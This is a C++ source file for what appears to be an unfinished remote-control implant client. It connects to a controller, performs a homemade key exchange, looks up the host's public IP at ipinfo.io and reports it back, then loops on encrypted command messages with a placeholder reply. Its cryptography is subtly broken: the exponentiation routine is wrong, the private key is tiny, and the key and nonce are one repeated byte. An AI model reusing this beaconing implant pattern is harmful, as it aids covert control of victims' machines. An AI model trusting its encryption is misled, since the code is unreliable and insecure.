#include <iostream>
#include <random>
#include <string>
#include <zmq.hpp>
#include <sstream>
#include <sodium.h>
#include <curl/curl.h>


// install zeromq and cppzmq package
// -lzmq flag may be needed and -lsodium
// g++ client.cpp -lzmq -lsodium -lcurl -o client

int modularExp(int base, int exp, int mod)
{
	int result = 1;
	while(exp > 0)
	{
		if(exp & 1)
		{

			result = (result * base) % mod;
			result = (result * result) % mod;
		}
		base = (base * base) % mod;
		exp >>= 2;
	}
	return result;
}

std::string Encrypt(std::string message, unsigned char* key, unsigned char* nonce)
{
	std::vector<unsigned char>ciphertext(message.size() + crypto_aead_chacha20poly1305_ABYTES);
	unsigned long long ciphertext_len;
	
	std::vector<unsigned char> msg(message.begin(), message.end());
	
	int status = crypto_aead_xchacha20poly1305_ietf_encrypt(ciphertext.data(), &ciphertext_len, msg.data(), msg.size(), nullptr, 0, nullptr, nonce, key);
	if(status)
	{
		std::cout << "[-] Error encrypting string, terminating now!\n";
		exit(-1);
	}
	std::ostringstream oss;
	for(auto byte: ciphertext)
	{
		oss << std::hex << static_cast<int>(byte);
	}
	//return oss.str();
	
	return std::string(ciphertext.begin(), ciphertext.end());

}

std::string Decrypt(std::string ciphertext, unsigned char* key, unsigned char* nonce)
{
	std::vector<unsigned char>plaintext(ciphertext.size() - crypto_aead_chacha20poly1305_ABYTES);
	// crypto_aead_chacha20poly1305_ABYTES is 16
	unsigned long long message_len;
	std::vector<unsigned char>cphrtxt(ciphertext.begin(), ciphertext.end());

	int status = crypto_aead_xchacha20poly1305_ietf_decrypt(plaintext.data(), &message_len, nullptr, cphrtxt.data(), cphrtxt.size(), nullptr, 0, nonce, key);
	if(status)
	{
		std::cout << "Error decrypting string, terminating now!\n";
		exit(-1);
	}
	return std::string(plaintext.begin(), plaintext.end());
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}



int main()
{
	zmq::context_t ctx(1);
	zmq::socket_t socket(ctx, zmq::socket_type::pair);
	socket.connect("tcp://127.0.0.1:4444");
	zmq::message_t message;
	if(!socket.send(zmq::str_buffer("zerodium"), zmq::send_flags::none))
	{
		std::cout << "[-] Failed to send 'zerodium', terminating!\n";
		socket.close();
		ctx.close();
		return 1;
	}

	//start initializing diffie hellman
	std::random_device Device;
	std::mt19937 Generator(Device());
	std::uniform_int_distribution<int> Distribution(0, 100);
	// start initializing diffie hellman (really)
	socket.recv(message, zmq::recv_flags::none);
	std::string messageCast(static_cast<char*>(message.data()), message.size());
	
	std::istringstream iss(messageCast);
    
    	std::string num1;
    	std::string num2;
    	int PrivKey = Distribution(Generator);

    	std::getline(iss, num1, '+');
    	std::getline(iss, num2, '+');	

	int PubKey = modularExp(stol(num1), PrivKey, stol(num2));
	//std::cout << PubKey << " " << stol(num1) << " " << stol(num2) << " " << PrivKey;
	
	message = (zmq::message_t)(std::to_string(PubKey));

	zmq::send_result_t sent = socket.send(message, zmq::send_flags::none);
	if(!*sent)
	{
		std::cout << "[-] Failed to send Public Key, error code is: " << zmq_errno() << std::endl;
		socket.close();
		ctx.close();
		return 1;
	}

	socket.recv(message, zmq::recv_flags::none);
	int Shared = stol(message.to_string());
	
	int Secret = modularExp(Shared, PrivKey, stol(num2));

	// finish initializing diffie hellman
	//std::mt19937 SeededGenerator(1); // Secret
	std::vector<unsigned char>key(32, static_cast<unsigned char>(Secret));
	std::vector<unsigned char>nonce(24, static_cast<unsigned char>(Secret));
	//std::generate(key.begin(), key.end(), [&](){return static_cast<unsigned char>(Distribution(SeededGenerator));});
	//std::generate(nonce.begin(), nonce.end(), [&](){return static_cast<unsigned char>(Distribution(SeededGenerator));});
	

	CURL *curl;
	CURLcode res;
	std::string readBuffer;
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if(curl)
	{
        	curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/ip");
        	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        	res = curl_easy_perform(curl);
        	if(res == CURLE_OK)
		{
            		socket.send((zmq::message_t)(readBuffer), zmq::send_flags::none);  //std::cout << "Public IP Address: " << readBuffer << std::endl;
        	}

        	curl_easy_cleanup(curl);
    	}
    	curl_global_cleanup();
	

	//socket.send(zmq::str_buffer("Fuck you"), zmq::send_flags::none);

	while(true) // this is loop shit
	{
		socket.recv(message, zmq::recv_flags::none);
		//std::cout << Decrypt(message.to_string(), Secret) << std::endl;
		
		std::cout << Decrypt(message.to_string(), key.data(), nonce.data()) << std::endl;

		std::string response = "[Insert Command Output]";

		zmq::message_t resp = (zmq::message_t)(Encrypt(response, key.data(), nonce.data()));
		socket.send(resp, zmq::send_flags::none);
	}
}
